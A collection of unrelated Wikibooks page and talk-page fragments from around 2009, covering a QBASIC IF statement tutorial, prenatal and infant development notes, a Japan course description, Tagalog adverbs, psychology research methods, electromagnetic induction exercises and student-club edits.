: {{keep}} &gt;I am a college student and stumbling upon this page was really helpful to my understanding. This model of the atom is much clearer to me than other explanations. I vote to keep. &lt;small&gt;&lt;span class=&quot;autosigned&quot;&gt;—Preceding [[w:Wikipedia:Signatures|unsigned]] comment added by [[User:72.130.188.197|72.130.188.197]] ([[User talk:72.130.188.197|discuss]] • [[Special:Contributions/72.130.188.197|contribs]]) 18:25, 10 April 2009&lt;/span&gt;&lt;/small&gt;

:I certainly agree with Swift that this book had ''profound'' issues with original research, however equally Swift has done a good job of cleaning it up (whether that's complete or not would require a very thorough reading, which I don't have time for at present). I think it'd be best for the author to take on the job of ensuring that the current model is presented accurately and without further &quot;commentary&quot; - Wikibooks is not the place for that and I would be inclined to take more drastic actions if the author can't keep that in check. &amp;nbsp;'''&amp;mdash;&amp;nbsp;[[User:Mike.lifeguard|&lt;b style=&quot;color:#309;&quot;&gt;Mike.lifeguard&lt;/b&gt;]]'''&amp;nbsp;&amp;#124;&amp;nbsp;&lt;sup&gt;[[User talk:Mike.lifeguard|&lt;span style=&quot;color:#309;&quot;&gt;talk&lt;/span&gt;]]&lt;/sup&gt; 01:50, 18 April 2009 (UTC)

      <comment>Adding a detail about self-contained lines.</comment>
      <text xml:space="preserve">{{stub}}
The &lt;tt&gt;IF...THEN...ELSEIF...ELSE&lt;/tt&gt; control statement allows identifying if a certain condition is true, and executes a block of code if it is the case.

&lt;source lang=qbasic&gt;
IF number&lt;0 THEN
  PRINT &quot;Number is negative&quot;
ELSEIF number&gt;0 THEN
  PRINT &quot;Number is positive&quot;
ELSE
  PRINT &quot;Number is zero&quot;
END IF
&lt;/source&gt;

In some implementations of BASIC (but permitted by most versions), the IF statement may need to be contained in one line.  However, ELSEIF may not be available in this case, and there is no need for an explicit END IF:
&lt;source lang=qbasic&gt;
IF number&lt;0 THEN PRINT &quot;Number is negative&quot; ELSE PRINT &quot;Number is non-negative&quot;
&lt;/source&gt;

This carries over into some implementations of BASIC where if the &quot;IF...THEN&quot; statement is followed by code on the same line then it is fully contained. That is, the compiler assumes the lines ends with &quot;ENDIF&quot;, even if it not stated. This is important when dealing with nested &quot;IF...THEN&quot; clauses:

&lt;source lang=qbasic&gt;
IF X&lt;2 THEN
  IF 2&lt;3 THEN PRINT &quot;This is printed if X is 1&quot;
ELSE
  IF 3&lt;4 THEN PRINT &quot;This is printed if X is 3&quot;
END IF
&lt;/source&gt;

The ELSE clause, while following the &quot;IF 2&lt;3&quot; statement, is associated with the &quot;IF X&lt;2&quot; statement, because the &quot;IF 2&lt;3&quot; statement has a PRINT statement on the same line. This implies the

      <text xml:space="preserve">Prenatal development is the development of an organism before its birth. 
=== Stages of Prenatal Development ===
#Germinal stage - conception to 2 weeks
#*Begins at conception and ends when the zygote implants itself in the mother's uterine lining.
#*Between 8 and 12 days after conception, implantation occurs. this is when the zygote embeds itself in the inner lining of the mother's uterus
#Embryonic stage - 3 to 8 weeks after conception
#*blastocyst differentiates to form three cell layers in the embryo: the ectoderm, mesoderm, and endoderm.
#**The extoderm is the outer layer of the cell mall, and during the embryonic stage it gives rise ot then ervous sytem, sensory receptors, and out skin layers.
#**The mesoderm becomes the circulatorty system, skeleton, muscles, excretory system, reproducticve system, the outer layer of the digestive tract, and the inner layer of the skin.
#**The endoderm will eventually become the respiratory system and the remainder of the digestive system.
#*chronological development following conception
#**3rd week - vulnerable brain cells and spinal cord form from the neural tube
#**3rd and 4th week - placenta and umbilical cord form
#**by 4 weeks - eyes begin to form, torso continues to form, heart tissue begins to beat, arm buds appear
#**by 5 weeks - arms are developed and legs buds begin to form
#**during 8th week - organogenesis is complete, signaling the end of the embryonic stage and beginning of the fetal stage
#Fetal stage - week 9 to birth (38-40 weeks)
#*chronological development following conception
#**9 through 12 weeks - first arm and leg movements begin, reflexes appear, sex organs develop.
#**17 through 20 weeks - mother begins to feel movement, heartbeat can be heard with a stethoscope.
#**by 24 weeks - fat forms and rapid weight gain begins
#**26 through 28 weeks - lungs are mature enough to allow breathing 
#**28 though 40 weeks - major organ systems are functional and brain developes rapidly.
=== Teratogens ===
*preterm births occur before 37 weeks of gestation
*low birth weight is less than five and half pounds (two pounds lighter than average)

*Fetal Alcohol Syndrom (FAS)
**overall growth deficiency, head and facial malformations, and dysfunction of the central nervous sytem
*effects of alcohol use
** 
*effects of cocaine use
** 
*effects of cigarette smoking 
**  
*sexually transmitted diseases
**
*effects of stress

      <text xml:space="preserve">=== Stages of labor ===
#dilation
#*This stage of labor is the longest, lasting 6 to 14 hours.
#*This stage begins when the uterus starts regular contractions, which cause dilation.
#delivery
#*During this second stage of labor, the baby actually moves through the birth canal and is delivered. Lasting an average of 30 minutes to 2 hours. This stage ends with the delivery of the baby
#after birth
#*During the third and final stage, the placenta and other membranes emerge through the birth canal.
#*This stage usually lasts and hour, and the mother continues to experience weaker contractions.
*Types of delivery
*Drugs during delivery

      <text xml:space="preserve">&quot;Global Issues: Japan&quot; is a course at Webster University (enrollment 22,000), an independent, international university whose home campus is located in St. Louis, Missouri (USA). Its unique format involves a combination of online learning, a week-long trip to Japan, and the integration of student research and first-hand observations into this collaboratively authored WikiBook. 

The course is interdisciplinary: it is cross listed in three graduate academic programs: International Relations, International Business and Education. It is co-listed in two undergraduate programs: International Studies and Education. 

==What are &quot;Global Issues: Japan&quot;?==
&quot;Global&quot; issues are commonly defined as those issues that (1) transcend and cross national or political boundaries and (2) which impact the welfare of humans and other life forms on earth as well as the earth itself. The United Nations organizes global issues on its agenda according 50 categories. They include:

{|  border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; width=&quot;90%&quot; 
|  colspan=&quot;3&quot; valign=&quot;top&quot; | &lt;p align=&quot;center&quot;&gt;&lt;strong&gt;Global Issues on the United    Nations Agenda&lt;/strong&gt;&lt;br /&gt;
(List cited from: http://www.un.org/issues/) &lt;/p&gt;
|- 
|  valign=&quot;top&quot; | &lt;ul type=&quot;disc&quot;&gt;&lt;li&gt;Africa &lt;/li&gt;&lt;li&gt;Agriculture &lt;/li&gt;&lt;li&gt;AIDS &lt;/li&gt;&lt;li&gt;Atomic Energy &lt;/li&gt;&lt;li&gt;Children &lt;/li&gt;&lt;li&gt;Climate Change &lt;/li&gt;&lt;li&gt;Culture &lt;/li&gt;&lt;li&gt;Decolonization &lt;/li&gt;&lt;li&gt;Demining &lt;/li&gt;&lt;li&gt;Development Cooperation &lt;/li&gt;&lt;li&gt;Persons with Disabilities &lt;/li&gt;&lt;li&gt;Disarmament &lt;/li&gt;&lt;li&gt;Drugs &amp;amp; Crime &lt;/li&gt;&lt;li&gt;Education &lt;/li&gt;&lt;li&gt;Elections &lt;/li&gt;&lt;li&gt;Energy &lt;/li&gt;&lt;li&gt;Environment &lt;/li&gt;&lt;/ul&gt;
|  valign=&quot;top&quot; | &lt;ul type=&quot;disc&quot;&gt;&lt;li&gt;Family &lt;/li&gt;&lt;li&gt;Food &lt;/li&gt;&lt;li&gt;Governance &lt;/li&gt;&lt;li&gt;Health &lt;/li&gt;&lt;li&gt;Human Rights &lt;/li&gt;&lt;li&gt;Human Settlements &lt;/li&gt;&lt;li&gt;Humanitarian and Disaster Relief Assistance &lt;/li&gt;&lt;li&gt;Indigenous People &lt;/li&gt;&lt;li&gt;Information Communications Technology &lt;/li&gt;&lt;li&gt;Intellectual Property &lt;/li&gt;&lt;li&gt;International Finance &lt;/li&gt;&lt;li&gt;Iraq &lt;/li&gt;&lt;li&gt;Labour &lt;/li&gt;&lt;li&gt;International Law &lt;/li&gt;&lt;li&gt;Oceans and the Law of the Sea &lt;/li&gt;&lt;li&gt;Least Developed Countries &lt;/li&gt;&lt;/ul&gt;
|  valign=&quot;top&quot; | &lt;ul type=&quot;disc&quot;&gt;&lt;li&gt;The Millennium UN General Assembly - The Goals &lt;/li&gt;&lt;li&gt;Question of Palestine &lt;/li&gt;&lt;li&gt;Peace &amp;amp; Security &lt;/li&gt;&lt;li&gt;Population &lt;/li&gt;&lt;li&gt;Refugees &lt;/li&gt;&lt;li&gt;Science and Technology &lt;/li&gt;&lt;li&gt;Social Development &lt;/li&gt;&lt;li&gt;Outer Space &lt;/li&gt;&lt;li&gt;Statistics &lt;/li&gt;&lt;li&gt;Sustainable Development &lt;/li&gt;&lt;li&gt;Terrorism &lt;/li&gt;&lt;li&gt;Trade &amp;amp; Development &lt;/li&gt;&lt;li&gt;Volunteerism &lt;/li&gt;&lt;li&gt;Water &lt;/li&gt;&lt;li&gt;Women &lt;/li&gt;&lt;li&gt;Youth &lt;/li&gt;&lt;/ul&gt;
|}

This course offers an initial exploration into some of the issues listed above as it relates to Japan. This exploration will involve a variety of data sources, including 
(1) reading and research in traditional academic, such as readings in books, journal articles and other published documents; 
(2) tracking current and emergent news media, internet and broadcast (television and radio) sources; 
(3) multimedia and video resources; 
(4) first hand visits, observations and seminars at pertinent locations in Japan. 
The learning methodology employed for this course is constructivist and collaborative. 
The constructivist pedagogy is a philosophy of learning in which learners build their knowledge on the basis of authentic (real-world) experiences and dialogue, debate, or collaboration with others. (Brown and King, 2000) The effectiveness of the constructivist pedagogy versus objectivist pedagogies has been debated for centuries. However, current theory and research in learning indicate that all learning involves a self-constructing process. (Bransford, ''et al.'', 2000; Poole, 2000; Scardamalia and Bereiter, 1994)

Adverb is a word which adds to the meaning of a Verb, and tells us how a thing is done and when it is done, or where it is done; e.g.,

* Bumalik si Maria '''Kahapon'''
** Mary returned '''Yesterday'''&lt;br/&gt;
* Natutulog nang '''Mahimbing''' si Pepeng
** Pepeng is sleeping '''deeply'''&lt;br/&gt;
* Umaaraw sa '''buong''' Mundo
** The Sun shines '''Around''' the world&lt;br/&gt;

===Types of Adverbs===
:1. ''Pamaraan'' - The way the action is acted. Answers the question ''How?''
:: ''Kumain si Delia nang '''matumal'''.'' - Delia ate '''slowly'''.
:2. ''Panlunan'' - The place where the action is acted. Answers the question ''Where?''
:: ''Namasyal sila sa '''merkado'''.'' - They loitered/shopped in the '''market'''.
:3. ''Pananggi'' - A Negative response to a question.
:: '''''Hindi''', wala kaming pratiks ngayong araw.'' - '''No''', we're not having a practice today.
:4. ''Pamanahon'' - The time when the action is acted. Answers the question ''When?''
:: ''Umalis sila '''kahapon''' papuntang Boracay.'' - They left '''yesterday''' for Boracay. 
:5. ''Panangayon'' - A Positive response to a question.
:: '''''Oo''', mayroong kaming handa para sa kanyang kaarawan.'' - '''Yes''', we have a celebration for his birthday.
:6. ''Pang-agam'' - No assurance.
:: '''''Baka''' nandoon siya sa plaza namamasyal.'' - '''Maybe''', she's in the plaza loitering.

      <text xml:space="preserve">[[User:Kimg20|Kimg20]] ([[User talk:Kimg20|talk]]) 05:18, 1 May 2009 (UTC)I edited the part on Cultural Relativism because at first it only explained the concept in such a vague way. I edited it in a sense to give it more of an example listing concepts such as law, morality, politics, etc. The idea that cultures are all different and should not be judged was the main point I was getting at. Therefore, I wanted others to sense it as well.

The reason why I added the definition of recruitment was to make the paragraphs pertaining to certain AS clubs to flow. I thought that the definition of recruitment would help others who read that section understand the main topic.</text>

[[Image:Symbol keep vote.svg|15px]] '''Keep''' Is this category needed? I see the following reasons in favour of this category:

[[Image:Symbol support vote.svg|15px]] '''fewer subcategories in [[:Category:Languages]]'''

[[Image:Symbol support vote.svg|15px]] '''consistency with other categorization schemes, e.g. [[:Category:Languages by category]]''' 

[[Image:Symbol support vote.svg|15px]] '''no mixing of the continent categories ([[:Category:Languages of Africa]], etc.) with unrelated categories such as [[:Category:Languages textbook pages]] or [[:Category:Soundbite requests]]'''

I see only one reason against this category:

[[Image:Symbol oppose vote.svg|15px]] ''' consistency with the Subjects hierarchy'''

However, the last point is particular weak because the Subjects hierarchy was designed to be more reader-friendly, i.e., deviations between the category hierarchy and the subjects hierarchy are no accident and no reason to change either. (If needed I will elaborate this point.) --[[User:Martin Kraus|Martin Kraus]] ([[User talk:Martin Kraus|talk]]) 09:13, 1 May 2009 (UTC)

: I agree that this category should be kept, despite my belief that consistency with Wikipedia's categories is a particularly weak argument as well. However I don't see the need or point in keeping &quot;Languages textbook pages&quot; because they should all be in some other subcategory already. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 14:54, 1 May 2009 (UTC)

:: I have to agree that Wikibooks is not Wikipedia.  I also support Darklama's point on [[:Category:Languages textbook pages]].  [[Wikibooks:CCO Resources]] (even before my efforts to improve it, thus leaving an edit by myself on it) stated that a book's title page and title category would be filed in the same subcategory.  With the current system in [[:Category:Languages]], a new book creator has to tag their title page &quot;Languages of Africa&quot; but then be aware that there is an exception and they need to tag their title category &quot;Languages textbook pages&quot; instead.  I had been remedying this in, for instance, [[:Category:Languages of Oceania]].  -- [[User:Adrignola|Adrignola]] &lt;sup&gt;[[User talk:Adrignola|talk]] [[Special:Contributions/Adrignola|contribs]]&lt;/sup&gt; 15:12, 1 May 2009 (UTC)

:::We are not just talking about [[:Category:Languages textbook pages]] but also about [[:Category:Computing textbook pages]], [[:Category:Engineering textbook pages]], and [[:Category:Science textbook pages]]. I haven't invented this system of categorizing book categories, I only tried to respect it when I worked on [[:Category:Languages]]. If we want to abandon it: fine, but I think we should discuss this decision first since it affects almost every book. The way Adrignola tries to separate book categories from other categories in their parent category X by using &lt;nowiki&gt;[[Category:X|*{{PAGENAME}}]]&lt;/nowiki&gt; shows that there is a need to separate these categories. Using categories like &quot;Category:X textbook pages&quot; is IMHO a better way to separate book categories from other categories than the way used by Adrignola. Either way, this issue should be discussed and documented.--[[User:Martin Kraus|Martin Kraus]] ([[User talk:Martin Kraus|talk]]) 15:54, 1 May 2009 (UTC)

:::: A lot of the &quot;X textbook pages&quot; categories have been deleted over time as better ways to categories those books have been found too. There aren't that many [{{fullurl:Special:Search/intitle:&quot;textbook pages&quot;|ns14=1}} left]. I think such categories were created earlier on in Wikibooks' history. I wouldn't even be surprised if they were originally created back when Wikibooks was known as textbooks.wikipedia.org. There shouldn't be a need to separate book categories from other categories or to use &quot;*&quot; either IMO. There shouldn't be a lot of book categories that can't be subdivided into smaller topics (like african languages, european languages, etc). --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 16:32, 1 May 2009 (UTC)

:::Maybe we should move this discussion to another place, I suggest [[Wikibooks talk:Categories#Categorization of book categories]]. --[[User:Martin Kraus|Martin Kraus]] ([[User talk:Martin Kraus|talk]]) 16:09, 1 May 2009 (UTC)

: I don't see why the categories can't be reader friendly as well. That's not for or against this category, just my philosophy in general.  I'd like it so that if someone puts a page in a category, its parent category matches the corresponding subject's parent. ''However'', [[:Category:Languages]] does appear to be an exception due to the additional categories you mention. I will leave [[:Category:Languages by continent]] alone since someone who wants to file a book under Languages by Africa will have a category of the same name to put it in and the category Languages by continent is simply an intermediary that never shows up in the subject hierarchy. -- [[User:Adrignola|Adrignola]] &lt;sup&gt;[[User talk:Adrignola|talk]] [[Special:Contributions/Adrignola|contribs]]&lt;/sup&gt; 15:12, 1 May 2009 (UTC)</text>

*#Predict what behaviors will happen in the future
*#Understand why, when, and how events occur
*#Apply this knowledge to solving real-world problems
*'''Scientific method''': orderly systematic procedures used as we: 
**Figure out what we will research. 
**Collect and analyze data. 
**Draw conclusions on data. 
**Communicate our findings. If we do not communicate the findings, we are not following the scientific method. 
***It isn’t enough to know things even when they are obvious, you must do the research. 
**This is done to see if we can support a hypothesis.
*'''Predictive hypothesis''': Prediction about a relationship between two variables. Relationship between two things. Relationship between income level and amount of education.
**'''Hypothesis''': “Educational guess”, guess about what your research will conclude. Goal of research is to support or disprove your hypothesis. “Does two hours of study help grades?”
***'''Variables''': Subjects with the capability to change. Events, characteristics, behaviors or conditions that researches measure and studied.
*'''Descriptive studies''': Often used in predicting hypothesis. Describes behaviors and relationships, without cause and effect.
*#'''Naturalistic observation''': Observing in natural environment, trying not to be noticed. Jane Goodall observing primates.
*#*'''Strengths''': Nothing artificial about behaviors, realistic view.
*#*'''Weaknesses''': Variables change behavior when observed. Possible interaction between observer and observee. Takes a while to obtain information.
*#'''Case Study''': Done because something is new or unusual about subject. Done to find out as much information as possible. We don’t know as much about the subject. Often for rare disorders. This is an in depth study of one individual or a small group.
*#*'''Strengths''': A lot of data is produced, can find out new information.
*#*'''Weaknesses''': Even slower than naturalistic observations. Very small sample size and people, results are often limited to one person or group.
*#'''Survey Method''': People answer questions. Questionnaires, verbal, telemarketing.)
*#*'''Strengths''': A lot of data obtained, fairly cheap. People are more likely to discuss personal information. You can collect data on subjects that are often not easily observed, such as sex.
*#*'''Weaknesses''': People lie, don’t take surveys seriously. Can’t verify honesty. Margin of error. People can be mislead by phrasing of questions: “You don’t like Obama, do you?” Also severely limited by demographics, who is taking the survey? Surveys are not always representative of all people.
*'''Nondescriptive studies (correlational research methods)''': (Predictions based on) correlations- Measure of relationship between two variables. Variables must be quantifiable, put into a measurable number. Height, weight, anything that is measureable, age, hair, IQ. “Is there a relationship between height and IQ?” The relationships of correlations can be:
**'''Positive correlations''': When the amount of one variable increases, the other variable also increases. Positive correlations move in the same direction, both variables increase or both variables decrease. The taller a person, the heavier. The relationship is that when a variable goes up the other does also.
**'''Negative correlations''': When the amount of one variable increases, the amount of the other variable in the relationship decreases. The more alcohol consumed, the amount of coordination decreases. The amount of hours without sleep, the lower the grades received.
**'''Coefficient of correlation''': degree of relation. How much do they relate? -1  –– 0 ––   +1  The closer to zero, the weaker the relationship. 0=no relationship. +1= a perfect positive correlation between two variables, the strongest you can get, this happens almost never. An example of a perfect positive correlation is the faster you travel, the farther away you go. 
***Strongest relationships lie farthest from zero. Negative or positive is the direction of the relationship. 
***Strength of relationship relies on the distance of a number from zero, not on positive or negative traits.

      <text xml:space="preserve">=== Physical Developments ===
*Prematurity
**occurs before 37 weeks of gestation or about 3 weeks earlier than the normal due date
**Low birth weight is weight less than 5 ½ pounds at birth (2 pounds lighter than average); indicates potential for health risks
**Very low birth weight is weight less than 3 ½ pounds at birth (4 pounds lighter than average); indicates greater potential for health risks
**Small for gestational age (SGA) is born below the tenth percentile of birth weight for gestational age; indicates serious health risks
**Prevention includes childbirth classes, healthy lifestyles and especially good prenatal care, but sometimes there is nothing you can do
*Infant Mortality
**Refers to deaths that occur before the age of 1 year  
*Having a Healthy Baby
**Prenatal care is important 
*Growth of the Body and Brain 
**Physical Growth
***Average birth weight is 7 ½ pounds, with males bout ½ pound heavier than females 
***Baby's weight doubles in first 5 months
***About 20 inches at birth and half of adult height by age 2 
**Feeding and Nutrition (Breastfeeding)
***Sterile, cheap, “specially formulated”
***Colostrums are a thick, yellowish substance in breast milk containing important antibodies (only for the first few days of breastfeeding) 
***Breastfed babies are at less risk of SIDS, asthma, and other illnesses
***Breastfeeding helps mom lose weight faster, and lowers risk of breast and ovarian cancer
***Infectious diseases can be spread via breast milk, so some mothers can’t (iron enriched formula)
***Exclusively for 6 months, slowly introduce iron-rich foods from 6-12 months, judgment call after
***More likely if mom married, higher income, and supported to breastfeed, but only ¼ by 6 mnths
*Structure of the Brain and Nervous System
**Spinal cord is the “information superhighway”
**Brain stem controls automatic functions
**Cerebellum is on the back of the brain and controls posture, body orientation, and complex muscle movements
**Neurons are specialized cells that process information and allow communication in the nervous system (form by 7 weeks)
**Cerebral cortex is the “gray matter” that forms the top portion of brain and is divided into the 4 lobes (10 wks)
*Forming the Brain and Nervous System
**Neural tube at about 4 weeks, which later develops into central nervous system
**Synaptogenesis is one form of neuron maturation in which dendrites and axons branch out to form an enormously large number of connections with neighboring neurons (by 23 weeks)
**Most neural connections (synapses) form AFTER birth, as a result of maturation and experiences
**Myelination is a form of neuron maturation in which the fatty insulation (myelin sheath) grows around the axons; occurs in different parts of the brain at different times 
**Programmed cell death is a process by which many neurons die during periods of migration and heavy Synaptogenesis (we lose half before even born!)  
*Sensory Capabilities
**Vision
***Visual acuity is the ability to see fine detail 
***Infants prefer faces 
***Newborns vision is somewhere between 20/150 and 20/600, reaches 20/20 by bout 6 months
***Normal color vision by 3 months
***Prefer to look at green, yellow, or red over gray 
***Depth perception by just under two months, but afraid of cliff by time can crawl
***Binocular disparity is the difference between the images projected on the two eyes
***Pictorial cues are relative size and density of the pattern elements shown beneath the glass
**Hearing 
***Hearing is functional before birth
***Recognize own names by 5 months 
**Smell and Taste
***Facial expressions show that newborn babies react to certain odors and tastes similar to adults
***The fetal system is well enough developed sometime near the end of gestation to sense and store information about odors encountered before birth
*Motor Development
**Reflexes
***Reflexes are involuntary movements elicited by environmental stimuli
***Important early indicators of nervous system function 
***Primitive reflexes disappear around 4 months; help the infant to find nourishment or might have served protective functions during earlier periods of evolution
***Postural reflexes disappear by 12 months; help infants to keep their heads upright, maintain balance, and roll their heads in the direction of their body motion
***Locomotor reflexes disappear by 4 months; mimic locomotor movements such as crawling, stepping, and swimming 
**Voluntary Movements
***Gross motor development is the process of coordinating movements with the large muscles in the body (first step around 1 year) 
***Fine motor development is the process of coordinating intricate movements with smaller muscles  
**Influences on Motor Development
***Maturation of the muscles and brain
**Opportunities for practice
***culture differences in early experience

=== Cognitive Developments ===

*Perceptual Development
**research techniques:
***Preferential-looking
****technique used to test infant visual perception.  If infants consistently look longer at some patterns than at others, researchers infer that the infants can see a difference between the patterns 
****Babies prefer moving stimuli, sharp color contrasts, symmetrical patterns, curved patterns, patterns with some complexity or detail, and patterns that resemble the human face 
****Babies are already equipped at birth with an innate schema, or mental framework, of the human face 
***Habituation-dishabituation
****technique used to test infant perception. Infants are shown a stimulus repeatedly until they respond less (habituate) to it.  Then a new stimulus is presented.
****Habituation is the tendency of infants to reduce their response to stimuli that are presented repeatedly.
****Dishabituation= is the recovery or increase in infant’s response when a familiar stimulus is replaced by one that is novel.  
****Intermodal Perception is the process of combining or integrating ifnormatino across sensory modalities.
***“Impossible events” (Renee Baillargeon)
***Most recent method of assessing infant cognition is via neuroscience (wave imaging)
*Explaining Cognitive Development: Piaget’s Constructivist View 
**Mental processes (thought, memory, solving problems, language) 
***Children’s thoughts gradually becomes more organized and complex (cognitive development)

      <text xml:space="preserve">I marked the term CLI for further clarification, because although I believe it means Command Line Interpreter or Interface, it is by no means clear in the text what a CLI is. The same can be said of the term HCI which I think means Human Computer Interface, Defining the terms would at least make it obvious to people who are not current on the jargon, what is meant.--[[User:Graeme E. Smith|Graeme E. Smith]] ([[User talk:Graeme E. Smith|talk]]) 16:12, 1 May 2009 (UTC)

Should this book say a few words about the command-line interface and the WIMP interface (historical predecessors) before launching into a discussion of post-WIMP interfaces?
--[[User:DavidCary|DavidCary]] ([[User talk:DavidCary|talk]]) 05:42, 7 May 2009 (UTC)

: This book is about the ''evolution'' of OS design, so surely it should say a lot more than just a few words? I suggest renaming the chapter to &quot;User Interaction&quot; and go into more detail not only about technology that goes beyond WIMP, but about also about past technologies as well. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 13:02, 7 May 2009 (UTC)

You know that is a good point, I have added some sub-modules here and there, and fleshed out some areas where I thought It needed more bulk, but I stayed away from changing the basic structure of the book for fear I didn't understand its structure. I even left in one of the original authors obvious bias against modern operating systems that I note you have now flagged. Since the original authors have no longer much interest in the book, what do we do about historical contributions that might be inaccurate?--[[User:Graeme E. Smith|Graeme E. Smith]] ([[User talk:Graeme E. Smith|talk]]) 15:12, 7 May 2009 (UTC)

== Major Issues and factual concerns ==

There are probably far too many issues here for me to list specifically, lest I begin to rewrite the page, which I sadly do not have the time for at present, but would encourage anyone editing in future to remove the blatantly opinionated statements first, and I would like to point out and critique a few of those statements to start off with:

&quot; nearly all implementations of WIMP are broken variants without the full programmable power of CLIs &quot;

Variants of what? 
&quot;programmable power of CLI&quot; - not defined or pre-defined

&quot; Despite the decrepitude of WIMP &quot; - Opinion, without observable basis.

&quot; Fortunately, despite the total incompetence of mainstream OS designers, research in HCI has managed to sustain a snail's pace &quot; - This is as far as I was able to read whilst retaining a credible outlook on this page as a source of information. It is completely inaccurate and derogatory.


In fact, after a brief read of the entire Wikibook, I suspect that this book needs to be scrapped, or completely re-written and I will return to this soon to assist.</text>

      <comment>/* Holly's Law */</comment>
      <text xml:space="preserve">A magnetic field creates a current in a wire moving through it. This process is known as induction.

==Flux Linkage==
A magnetic field going through a coil of wire has a property known as flux linkage. This is the product of the flux &amp;Phi; and the number of coils in the wire N.

==Faraday's Law==
Electric current is only induced in a coil of wire if the magnetic field is moving relative to the coil. Faraday's Law gives the electromotive force (emf) &amp;epsilon; produced in a coil by a magnetic field:

&lt;math&gt;\epsilon = -N\frac{d\Phi}{dt}&lt;/math&gt;

In other words, the emf (electric potential) induced in the coil is proportional to the rate of change of flux linkage. In practice, this means that if the coil is stationary relative to the magnetic field, no emf is induced. In order to induce emf, either the coil or the magnetic field must move. Alternatively, we may change the number of coils, for example, by crushing the coil, or pressing a switch which added more coils into the circuit, or moving more of the coils into the magnetic field.

Faraday's Law also works the other way. If we were to integrate both sides and rearrange the formula in terms of &amp;Phi;, we would find that the flux depends on the integral of the voltage - not on its rate of change. If we put an emf across a coil, it induces a magnetic field. The flux does not depend on the rate of change of emf, but the emf does depend on the rate of change of the flux linkage.

==Lenz's Law==
Lenz's Law describes the direction of the current / emf induced by a change in magnetic flux. It states that current induced opposes the magnetic field. It does this by creating its own magnetic field. This explains the minus sign in Faraday's Law. This also means that the flux induced by a current (not a change in current) is proportional to the current, since the flux is produced in response to the current.

So, a change in flux induces a current and a voltage which is proportional to the rate of change of flux. This fits with Ohm's Law (V = IR). A current and a voltage in a coil induce a flux which is proportional to the current and the voltage.

==Questions==

1. What is the flux linkage of a 30cm coil of 0.5mm thick wire with a flux perpendicular to it of 10Wb?

2. If the above coil is crushed steadily over a period of 2s, what emf is maintained?

3. The flux in a flux circuit varies according to the equation &amp;Phi; = sin &amp;omega;t. What is the equation for the emf induced?

4. Using a constant k, what is the equation for a current which could induce the flux in the flux circuit above?

5. Draw a graph of the flux, flux linkage, emf and current as deduced in the previous two questions.

      <text xml:space="preserve">'''1. What is the flux linkage of a 30cm coil of 0.5mm thick wire with a flux perpendicular to it of 10Wb?'''

&lt;math&gt;N = \frac{30 \times 10^{-2}}{0.5 \times 10^{-3}} = 600\mbox{ coils}&lt;/math&gt;

&lt;math&gt;N\Phi = 600 \times 10 = 6000\mbox{ Wb}&lt;/math&gt;

'''2. If the above coil is crushed steadily over a period of 2s, what emf is maintained?'''

&lt;math&gt;\mid \epsilon \mid = \frac{dN\Phi}{dt} = \frac{6000}{2} = 3000\mbox{ V}&lt;/math&gt;

This principle of removing the flux linkage rapidly (although not usually by destroying one's equipment) is used to create very high voltages for short periods of time.

'''3. The flux in a flux circuit varies according to the equation &amp;Phi; = sin &amp;omega;t. What is the equation for the emf induced?'''

&lt;math&gt;\epsilon = -\frac{dN\Phi}{dt} = -N\frac{d}{dt}\sin{\omega t} = -N\omega\cos{\omega t}&lt;/math&gt;

'''4. Using a constant k, what is the equation for a current which could induce the flux in the flux circuit above?'''

&lt;math&gt;I = -k\sin{\omega t}&lt;/math&gt;

'''5. Draw a graph of the flux, flux linkage, emf and current as deduced in the previous two questions.'''

In order to keep the scales sane, I used a 2-coil (N=2) coil to plot the following graph:

[[Image:Induction_graph.svg]]

Remember that the current here is inducing the flux (and flux linkage), which is in turn inducing the emf.

      <comment>EDIT D</comment>
      <text xml:space="preserve">The addition that I made was in Problems Scheduling Membership Meetings and Activities section of chapter 2. I added some things about consistency for weekly meetings and events. If clubs want to have a good turn out they have to be in the same place at the same time every time they meet as to reduce as much confusion as possible. I believe that with some consistency any club can succeed.


The first change I made was to the Sexuality section. I was reading the definitions for homosexual, heterosexual, etc. I noticed that the term for asexual was incorrect. I used the definition from the dictionary to change that. 

The second change that I made was to the hip-hop section of play, art, and music. At the end of the hip-hop section the previous author stated that in the U.S. the hip-hop artists didnt incorporate politics into their lyrics. They stated that in many other parts of the world &quot;politics&quot; were heard in the music, but not here in the states. In my experience with hip-hop I have found it to be the opposite. I have heard some extremely contraversial political lyrics from artists here in the U.S. I believe that some of the more mainstream hip-hop artists might not be &quot;able&quot; to express all of their feelings because of record companies but if you go below the surface to the underground you can hear music about the current war in Iraq, George Bush, slavery, lack of government help for the poor, Hurrican Katrina, the bad economy, WTA riots and many other political things.</text>

This text explores aspects of effective student organizations. Its primary focus is on clubs and organizations that exist on university campuses, are student focused, student operated and face particular organizational problems associated with student involvement. One of the major problems that these groups face is the loss of [[w:institutional knowledge|institutional knowledge]] when students in leadership positions graduate or leave the university. This wikibook aims to counter this loss of institutional knowledge by providing a record of the effective strategies that students are using to organize. 

The wikibook [[Managing Groups and Teams]] may serve as an excellent companion to this text, it offers a theoretically grounded and well detailed guide to effective leadership and management of groups.

==Suggestions for Future Chapters==
One of the key elements that went into the creation of this wikibook was the identification of the general difficulties that some of the Student Organizations at Western Washington University faced. A lot of work went into gathering and compiling this wiki book for the use of the clubs and there should be a chapter or place that the club leaders and/or members could go to with success stories and examples of how they where helped. This in turn could lend itself to others wishing to be more effective in their own organization, whether a club or in their own life experiences.

      <text xml:space="preserve">This page has Frequently Asked Questions about SwisTrack.  If your question isn't here, feel free to ask on the mailing list!

== Where can I get SwisTrack? ==

Right now, the best version to use is the latest version from svn.  Check it out at 
